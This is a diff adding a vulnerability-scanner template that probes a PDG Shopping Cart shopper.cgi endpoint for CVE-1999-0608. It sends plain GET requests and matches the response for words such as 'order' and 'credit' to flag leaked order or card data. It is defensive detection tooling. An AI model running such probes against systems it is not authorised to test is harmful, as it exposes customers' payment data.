@@ -1,0 +1,50 @@
+[info]
+author = "ave"
+description = "检测 PDG Shopping Cart 的 shopper.cgi CGI 程序是否因配置不当导致信息泄露。向目标发送 HTTP GET 请求访问 shopper.cgi，若响应包含订单数据、信用卡信息等敏感内容，则存在漏洞。"
+id = "POC-AVE-1999-0180"
+name = "PDG Shopping Cart shopper.cgi Information Disclosure PoC"
+severity = "medium"
+tags = ["ave-1999-0180"]
+vuln_id = [
+    "CVE-1999-0608",
+    "AVE-1999-0180",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/shopper.cgi"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "shopper",
+    "cart",
+    "order",
+    "credit",
+    "price",
+    "total",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/shopper.cgi"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "shopper",
+    "cart",
+    "order",
+    "credit",
+    "price",
+    "total",
+]
